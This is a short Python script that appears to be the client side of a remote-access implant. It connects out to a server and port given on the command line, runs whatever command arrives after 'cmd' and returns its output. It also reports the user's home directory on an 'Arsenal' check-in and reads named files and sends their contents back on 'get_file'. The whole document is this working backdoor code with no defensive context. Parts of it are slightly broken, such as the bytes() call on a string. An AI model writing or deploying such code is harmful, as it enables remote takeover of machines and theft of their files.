#!/usr/bin/python3
import socket, sys, os, subprocess, argparse, time
from struct import pack
parser = argparse.ArgumentParser(description='q*bert says hello')
parser.add_argument('-p', dest='port', required=True, type=int)
parser.add_argument('-s', dest='server', required=True)
args = parser.parse_args()

def main():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    buff = 4096
    s.connect((args.server, args.port))
    output = 'NSTR'
    while True:
        try:
            received = s.recv(buff).strip().split()
            command = [ str(x, 'utf-8') for x in received ]
            if 'cmd' in command:
                del command[0]
                print(command)
                output = subprocess.run(command, stdout=subprocess.PIPE)
                sendit(s, output.stdout)
            elif 'Arsenal' in command:
                sendit(s, 'Client initial checkin\nHomedir: %s\n' %os.environ.get('HOME'))
            elif 'get_file' in command:
                with open(command[1]) as f:
                    tmp = f.read()
                sendit(s, bytes(tmp))
        except socket.error as err:
            print("{0}\n".format(err))

def sendit(s, output):
    length = pack('>Q', len(output))
    s.sendall(length)
    s.sendall(output)

if __name__ == '__main__':
    main()
